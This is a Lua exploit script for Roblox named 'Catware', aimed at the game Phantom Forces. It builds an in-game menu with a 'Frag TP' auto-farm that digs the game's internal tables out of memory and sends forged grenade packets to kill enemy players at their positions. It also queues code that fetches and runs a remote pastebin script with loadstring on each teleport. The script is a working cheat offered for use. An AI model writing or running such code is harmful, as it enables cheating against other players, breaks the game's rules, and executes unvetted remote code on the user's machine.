local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local Move = game:GetService("Workspace").Map
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local decalsyeeted = true 
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
local camera = workspace.CurrentCamera;
local players = game:GetService("Players");
local localPlayer = players.LocalPlayer;
local charTbl;
local replicationTbl;
local pfCam;
local gameLogic;
local network;
local hud;
local char;
local menu;
local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or function() end
local ts,x = game:GetService("TeleportService")

-- Boosting FPS
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
-- Localizing UI
local ScreenGui = Instance.new("ScreenGui")
local Catware = Instance.new("Frame")
local CatLogo = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local Divider1 = Instance.new("Frame")
local HomeFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local Discord = Instance.new("TextButton")
local ButtonLabel = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local ButtonLabel_2 = Instance.new("TextLabel")
local UICorner_3 = Instance.new("UICorner")
local UIListLayout = Instance.new("UIListLayout")
local CloseBtn = Instance.new("TextButton")
local GamesFrame = Instance.new("Frame")
local Title_2 = Instance.new("TextLabel")
local ScrollingFrame_2 = Instance.new("ScrollingFrame")
local UIListLayout_2 = Instance.new("UIListLayout")
local AutoBtn = Instance.new("TextButton")
local ButtonLabel_3 = Instance.new("TextLabel")
local UICorner_4 = Instance.new("UICorner")
local ToggleBtn = Instance.new("Frame")
local Button = Instance.new("TextButton")
local Label = Instance.new("TextLabel")
local Button2 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local OpenDesc = Instance.new("TextButton")
local Desc = Instance.new("TextLabel")
local UICorner_6 = Instance.new("UICorner")
local CreditsFrame = Instance.new("Frame")
local Title_3 = Instance.new("TextLabel")
local CreditsLabel = Instance.new("TextLabel")
local UICorner_7 = Instance.new("UICorner")
local TabsHolder = Instance.new("Frame")
local UIListLayout_3 = Instance.new("UIListLayout")
local HomeBtn = Instance.new("TextButton")
local GamesBtn = Instance.new("TextButton")
local CreditsBtn = Instance.new("TextButton")

-- UI Settings / Scripts
ScreenGui.Parent = game.CoreGui

Catware.Name = "Catware"
Catware.Parent = ScreenGui
Catware.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
Catware.BorderColor3 = Color3.fromRGB(130, 203, 255)
Catware.ClipsDescendants = true
Catware.Position = UDim2.new(0.185567006, 0, 0.236363634, 0)
Catware.Size = UDim2.new(0, 556, 0, 294)

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if input.KeyCode == Enum.KeyCode.RightShift then
            if enabled == false then
                enabled = true
                Catware.Visible = true
            elseif enabled == true then
                enabled = false
                Catware.Visible = false
            end
        end
    end
end)

CatLogo.Name = "CatLogo"
CatLogo.Parent = Catware
CatLogo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CatLogo.BackgroundTransparency = 1.000
CatLogo.BorderSizePixel = 0
CatLogo.Position = UDim2.new(0.019784173, 0, 0.0238095224, 0)
CatLogo.Size = UDim2.new(0, 62, 0, 50)
CatLogo.Image = "http://www.roblox.com/asset/?id=8939420442"

UICorner.CornerRadius = UDim.new(1, 0)
UICorner.Parent = CatLogo

Divider1.Name = "Divider1"
Divider1.Parent = Catware
Divider1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Divider1.BorderSizePixel = 0
Divider1.Position = UDim2.new(0.136690646, 0, 0.0340136066, 0)
Divider1.Size = UDim2.new(0, 1, 0, 44)

HomeFrame.Name = "HomeFrame"
HomeFrame.Parent = Catware
HomeFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
HomeFrame.BackgroundTransparency = 1.000
HomeFrame.BorderSizePixel = 0
HomeFrame.ClipsDescendants = true
HomeFrame.Position = UDim2.new(0.019784173, 0, 0.183673471, 0)
HomeFrame.Size = UDim2.new(0, 535, 0, 233)
HomeFrame.Visible = false

Title.Name = "Title"
Title.Parent = HomeFrame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(-0.00772539712, 0, 0.00585380848, 0)
Title.Size = UDim2.new(0, 78, 0, 38)
Title.Font = Enum.Font.GothamBold
Title.Text = "Home"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18.000

ScrollingFrame.Parent = HomeFrame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.00747663574, 0, 0.167381972, 0)
ScrollingFrame.Size = UDim2.new(0, 531, 0, 195)
ScrollingFrame.ScrollBarThickness = 1

Discord.Name = "Discord"
Discord.Parent = ScrollingFrame
Discord.BackgroundColor3 = Color3.fromRGB(45, 44, 45)
Discord.BorderSizePixel = 0
Discord.Position = UDim2.new(0.00747663574, 0, 0.0515021533, 0)
Discord.Size = UDim2.new(0, 531, 0, 40)
Discord.AutoButtonColor = false
Discord.Font = Enum.Font.Gotham
Discord.Text = ""
Discord.TextColor3 = Color3.fromRGB(0, 0, 0)
Discord.TextSize = 14.000

Discord.MouseButton1Click:Connect(function()
    setclipboard('https://discord.gg/nsS3AGNDuQ')
end)

ButtonLabel.Name = "ButtonLabel"
ButtonLabel.Parent = Discord
ButtonLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ButtonLabel.BackgroundTransparency = 1.000
ButtonLabel.Position = UDim2.new(0.0301318262, 0, 0, 0)
ButtonLabel.Size = UDim2.new(0, 67, 0, 40)
ButtonLabel.Font = Enum.Font.Gotham
ButtonLabel.Text = "Discord"
ButtonLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ButtonLabel.TextSize = 17.000
ButtonLabel.TextXAlignment = Enum.TextXAlignment.Left

UICorner_2.CornerRadius = UDim.new(0.0299999993, 0)
UICorner_2.Parent = Discord

UIListLayout.Parent = ScrollingFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 15)

CloseBtn.Name = "CloseBtn"
CloseBtn.Parent = Catware
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.BackgroundTransparency = 1.000
CloseBtn.BorderSizePixel = 0
CloseBtn.Position = UDim2.new(0.924460411, 0, 0.0340136066, 0)
CloseBtn.Size = UDim2.new(0, 32, 0, 29)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(195, 194, 195)
CloseBtn.TextSize = 19.000

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)
GamesFrame.Name = "GamesFrame"
GamesFrame.Parent = Catware
GamesFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
GamesFrame.BorderSizePixel = 0
GamesFrame.ClipsDescendants = true
GamesFrame.Position = UDim2.new(0.019784173, 0, 0.20408164, 0)
GamesFrame.Size = UDim2.new(0, 535, 0, 227)

Title_2.Name = "Title"
Title_2.Parent = GamesFrame
Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_2.BackgroundTransparency = 1.000
Title_2.Position = UDim2.new(-0.00772539712, 0, 0.00585380848, 0)
Title_2.Size = UDim2.new(0, 78, 0, 38)
Title_2.Font = Enum.Font.GothamBold
Title_2.Text = "Features"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextSize = 18.000

ScrollingFrame_2.Parent = GamesFrame
ScrollingFrame_2.Active = true
ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_2.BackgroundTransparency = 1.000
ScrollingFrame_2.BorderSizePixel = 0
ScrollingFrame_2.Position = UDim2.new(0.00747663574, 0, 0.167381972, 0)
ScrollingFrame_2.Size = UDim2.new(0, 531, 0, 195)
ScrollingFrame_2.ScrollBarThickness = 1

UIListLayout_2.Parent = ScrollingFrame_2
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_2.Padding = UDim.new(0, 15)

AutoBtn.Name = "AutoBtn"
AutoBtn.Parent = ScrollingFrame_2
AutoBtn.BackgroundColor3 = Color3.fromRGB(45, 44, 45)
AutoBtn.BorderSizePixel = 0
AutoBtn.Position = UDim2.new(0.00747663574, 0, 0.218884125, 0)
AutoBtn.Size = UDim2.new(0, 531, 0, 40)
AutoBtn.AutoButtonColor = false
AutoBtn.Font = Enum.Font.SourceSans
AutoBtn.Text = ""
AutoBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
AutoBtn.TextSize = 14.000

ButtonLabel_3.Name = "ButtonLabel"
ButtonLabel_3.Parent = AutoBtn
ButtonLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ButtonLabel_3.BackgroundTransparency = 1.000
ButtonLabel_3.Position = UDim2.new(0.0301318262, 0, 0, 0)
ButtonLabel_3.Size = UDim2.new(0, 67, 0, 40)
ButtonLabel_3.Font = Enum.Font.Gotham
ButtonLabel_3.Text = "Frag TP"
ButtonLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
ButtonLabel_3.TextSize = 19.000
ButtonLabel_3.TextXAlignment = Enum.TextXAlignment.Left

UICorner_4.CornerRadius = UDim.new(0, 4)
UICorner_4.Parent = AutoBtn

ToggleBtn.Name = "ToggleBtn"
ToggleBtn.Parent = AutoBtn
ToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
ToggleBtn.BorderSizePixel = 0
ToggleBtn.Position = UDim2.new(0.920000017, 0, 0.150000006, 0)
ToggleBtn.Size = UDim2.new(0, 28, 0, 27)

Button.Name = "Button"
Button.Parent = ToggleBtn
Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button.BackgroundTransparency = 1.000
Button.BorderSizePixel = 0
Button.Size = UDim2.new(0, 28, 0, 27)
Button.Font = Enum.Font.SourceSans
Button.Text = ""
Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Button.TextSize = 14.000

local GernadeToggle = false

Button.MouseButton1Click:Connect(function()
    Label.TextTransparency = 0
    Button2.Visible = true
    Button.Visible = false
    GernadeToggle = true
    Move.Parent = ReplicatedStorage
            game:GetService("Workspace").Gravity = 0
end)

spawn(function()
    while true do
        wait(.2)
        if GernadeToggle == true then
            respawns_before_serverhop = respawns_before_serverhop or 0
            local tp = respawns_before_serverhop
            if tp == 0 then tp = math.huge end
            queueonteleport("if not game:IsLoaded() then wait(3) end respawns_before_serverhop = "..tostring(respawns_before_serverhop).."\nloadstring(game:HttpGet('https://pastebin.com/raw/PyWPzvyL'))()")
            
            game:GetService("Stats").Network.ChildRemoved:Connect(function(disconnected) if disconnected.Name=="ServerStatsItem" then ondisconnect() end end)
            task.spawn(function() for i = 1,10 do if not game:GetService("Stats").Network:FindFirstChild("ServerStatsItem") then ondisconnect() return end wait(1) end end)
            local things = 0
            repeat
            things = 0
            for i,v in pairs(getgc(true)) do
            if type(v) == "table" then
                if rawget(v, "getbodyparts") then
                    replicationTbl = v;
                    charTbl = debug.getupvalue(v.getbodyparts, 1);
                    things +=2
                end
                if rawget(v, "basecframe") then
                    pfCam = v;
                    things +=1
                end
                if rawget(v, "gammo") then
                    gameLogic = v;
                    things +=1
                end
                if rawget(v, "send") then
                    network = v;
                    things +=1
                end
                if rawget(v, "updateammo") then
                    hud = v;
                    things +=1
                end
                if rawget(v, "jump") then
                    char = v;
                    things +=1
                end
                if rawget(v, "isdeployed") then
                    menu = v;
                    things +=1
                end
            end
            end
            wait(1)
            until things == 8
            local function shootNade(targetPos)
            if gameLogic.gammo <= 0 then
                return;
            end
            local camCf = camera.CFrame;
            local rot = (camCf - camCf.Position);
            local args = {
                time = tick(),
                blowuptime = 0,
                frames = {
                    {
                        t0 = 0,
                        p0 = camCf.Position,
                        v0 = camCf.LookVector,
                        offset = Vector3.new(),
                        a = Vector3.new(0, -80,0),
                        rot0 = rot,
                        rotv = rot * Vector3.new(19, -5, 0),
                        glassbreaks = {}
                    },
                    {
                        t0 = 0,
                        p0 = targetPos,
                        v0 = Vector3.new(),
                        offset = Vector3.new(),
                        a = Vector3.new(),
                        rot0 = CFrame.new(),
                        rotv = Vector3.new(),
                        glassbreaks = {}
                    }
                }
            };
            network:send("newgrenade", "FRAG", args);
            gameLogic.gammo = gameLogic.gammo - 1;
            hud:updateammo("GRENADE");
            end
            
            local function getCharacterInCircle(center, radius)
            local results = {};
            for player, character in pairs(charTbl) do
                if player.Team ~= localPlayer.Team then
                    if character.torso and (character.torso.Position - center).Magnitude <= radius then
                        results[#results + 1] = character;
                    end
                end
            end
            return results;
            end
            
            
            while tp>0 do
            tp-=1
            do
                if not (char.rootpart and menu:isdeployed()) then
                    repeat
                        menu:deploy();
                        task.wait();
                    until char.rootpart and menu:isdeployed();
                end
                task.wait(1);
                local targets = {};
                for player, character in pairs(charTbl) do
                    if player.Team ~= localPlayer.Team then
                        if character.torso and character.head then
                            local charsInCircle = getCharacterInCircle(character.torso.Position, 30);
                            targets[#targets + 1] = charsInCircle;
                        end
                    end
                end
                table.sort(targets, function(a, b)
                    return #a > #b;
                end);
                for i = 1, 3 do
                    local t = targets[i];
                    if t then
                        for j = 1, #t do
                            local theirChar = t[j];
                            if theirChar and theirChar.torso then
                                shootNade(theirChar.torso.Position);
                                task.wait(0.1);
                            end
                        end
                    end
                end
            end
            network:send("forcereset");
            repeat task.wait() until not menu:isdeployed()
            end
            ondisconnect()
        end
    end 
end)


Label.Name = "Label"
Label.Parent = ToggleBtn
Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1.000
Label.Size = UDim2.new(0, 28, 0, 27)
Label.Font = Enum.Font.SourceSans
Label.Text = "✔"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextSize = 14.000
Label.TextTransparency = 1.000

Button2.Name = "Button2"
Button2.Parent = ToggleBtn
Button2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button2.BackgroundTransparency = 1.000
Button2.BorderSizePixel = 0
Button2.Size = UDim2.new(0, 28, 0, 27)
Button2.Visible = false
Button2.Font = Enum.Font.SourceSans
Button2.Text = ""
Button2.TextColor3 = Color3.fromRGB(0, 0, 0)
Button2.TextSize = 14.000


Button2.MouseButton1Click:Connect(function()
    Label.TextTransparency = 1
    Button.Visible = true
    Button2.Visible = false
end)
UICorner_5.CornerRadius = UDim.new(1, 0)
UICorner_5.Parent = ToggleBtn

OpenDesc.Name = "OpenDesc"
OpenDesc.Parent = AutoBtn
OpenDesc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OpenDesc.BackgroundTransparency = 1.000
OpenDesc.Size = UDim2.new(0, 481, 0, 40)
OpenDesc.Font = Enum.Font.SourceSans
OpenDesc.Text = ""
OpenDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenDesc.TextSize = 14.000

OpenDesc.MouseButton1Click:Connect(function()
    Desc:TweenSize(UDim2.new(0, 531, 0, 50), "Out", "Quart", .2)
    wait(4)
    Desc:TweenSize(UDim2.new(0, 531, 0, 0), "Out", "Quart", .1)
end)

Desc.Name = "Desc"
Desc.Parent = OpenDesc
Desc.BackgroundColor3 = Color3.fromRGB(45, 44, 45)
Desc.BorderColor3 = Color3.fromRGB(27, 42, 53)
Desc.BorderSizePixel = 0
Desc.ClipsDescendants = true
Desc.Position = UDim2.new(0, 0, 1.25, 0)
Desc.Size = UDim2.new(0, 531, 0, 0)
Desc.Font = Enum.Font.SourceSansSemibold
Desc.Text = "Frag TP is kinda of like a auto farm for Phantom Forces (levels fast), it resets and sends gernades to one enemy at a time (multiple enemies spawn in one area)"
Desc.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc.TextSize = 16.000
Desc.TextWrapped = true

UICorner_6.CornerRadius = UDim.new(0, 4)
UICorner_6.Parent = Desc

CreditsFrame.Name = "CreditsFrame"
CreditsFrame.Parent = Catware
CreditsFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
CreditsFrame.BorderSizePixel = 0
CreditsFrame.Position = UDim2.new(0.019784173, 0, 0.183673471, 0)
CreditsFrame.Size = UDim2.new(0, 535, 0, 233)
CreditsFrame.Visible = false

Title_3.Name = "Title"
Title_3.Parent = CreditsFrame
Title_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_3.BackgroundTransparency = 1.000
Title_3.Position = UDim2.new(-0.00772539712, 0, 0.00585380848, 0)
Title_3.Size = UDim2.new(0, 78, 0, 38)
Title_3.Font = Enum.Font.GothamBold
Title_3.Text = "Credits"
Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_3.TextSize = 18.000

CreditsLabel.Name = "CreditsLabel"
CreditsLabel.Parent = CreditsFrame
CreditsLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CreditsLabel.BackgroundTransparency = 1.000
CreditsLabel.Position = UDim2.new(0.0112149529, 0, 0.2360515, 0)
CreditsLabel.Size = UDim2.new(0, 529, 0, 178)
CreditsLabel.Font = Enum.Font.SourceSansBold
CreditsLabel.Text = "UI Design - Disguised Fox#6736                                                                                                          Scripter - 0909#3981"
CreditsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CreditsLabel.TextSize = 19.000
CreditsLabel.TextWrapped = true
CreditsLabel.TextXAlignment = Enum.TextXAlignment.Left
CreditsLabel.TextYAlignment = Enum.TextYAlignment.Top

UICorner_7.CornerRadius = UDim.new(0, 5)
UICorner_7.Parent = Catware

TabsHolder.Name = "TabsHolder"
TabsHolder.Parent = Catware
TabsHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TabsHolder.BackgroundTransparency = 1.000
TabsHolder.Position = UDim2.new(0.152877703, 0, 0.0476190485, 0)
TabsHolder.Size = UDim2.new(0, 341, 0, 41)

UIListLayout_3.Parent = TabsHolder
UIListLayout_3.FillDirection = Enum.FillDirection.Horizontal
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 5)

HomeBtn.Name = "HomeBtn"
HomeBtn.Parent = TabsHolder
HomeBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HomeBtn.BackgroundTransparency = 1.000
HomeBtn.Position = UDim2.new(0.152877703, 0, 0.0476190485, 0)
HomeBtn.Size = UDim2.new(0, 61, 0, 36)
HomeBtn.AutoButtonColor = false
HomeBtn.Font = Enum.Font.GothamSemibold
HomeBtn.Text = "Home"
HomeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
HomeBtn.TextSize = 16.000
HomeBtn.TextTransparency = 0.300

HomeBtn.MouseButton1Click:Connect(function()
    GamesFrame.Visible = false
    HomeFrame.Visible = true
    CreditsFrame.Visible = false
end)

GamesBtn.Name = "GamesBtn"
GamesBtn.Parent = TabsHolder
GamesBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GamesBtn.BackgroundTransparency = 1.000
GamesBtn.Position = UDim2.new(0.262589961, 0, 0.0476190485, 0)
GamesBtn.Size = UDim2.new(0, 61, 0, 36)
GamesBtn.AutoButtonColor = false
GamesBtn.Font = Enum.Font.GothamSemibold
GamesBtn.Text = "Features"
GamesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
GamesBtn.TextSize = 16.000
GamesBtn.TextTransparency = 0.300

GamesBtn.MouseButton1Click:Connect(function()
    GamesFrame.Visible = true
    HomeFrame.Visible = false
    CreditsFrame.Visible = false
end)

CreditsBtn.Name = "CreditsBtn"
CreditsBtn.Parent = TabsHolder
CreditsBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CreditsBtn.BackgroundTransparency = 1.000
CreditsBtn.Position = UDim2.new(0.480215907, 0, 0.0476190485, 0)
CreditsBtn.Size = UDim2.new(0, 61, 0, 36)
CreditsBtn.AutoButtonColor = false
CreditsBtn.Font = Enum.Font.GothamSemibold
CreditsBtn.Text = "Credits"
CreditsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CreditsBtn.TextSize = 16.000
CreditsBtn.TextTransparency = 0.300

CreditsBtn.MouseButton1Click:Connect(function()
    GamesFrame.Visible = false
    HomeFrame.Visible = false
    CreditsFrame.Visible = true
end)

-- Scripts:

local function EKKO_fake_script() -- Catware.SmoothDrag 
    local script = Instance.new('LocalScript', Catware)

    function dragify(b)dragToggle=nil dragSpeed=.10 dragInput=nil dragStart=nil dragPos=nil function updateInput(a)Delta=a.Position-dragStart Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+Delta.X,startPos.Y.Scale,startPos.Y.Offset+Delta.Y)game:GetService("TweenService"):Create(b,TweenInfo.new(.25),{Position=Position}):Play()end b.InputBegan:Connect(function(a)if(a.UserInputType==Enum.UserInputType.MouseButton1 or a.UserInputType==Enum.UserInputType.Touch)then dragToggle=true dragStart=a.Position startPos=b.Position a.Changed:Connect(function()if(a.UserInputState==Enum.UserInputState.End)then dragToggle=false end end)end end)b.InputChanged:Connect(function(a)if(a.UserInputType==Enum.UserInputType.MouseMovement or a.UserInputType==Enum.UserInputType.Touch)then dragInput=a end end)game:GetService("UserInputService").InputChanged:Connect(function(a)if(a==dragInput and dragToggle)then updateInput(a)end end)end dragify(script.Parent)
end
coroutine.wrap(EKKO_fake_script)()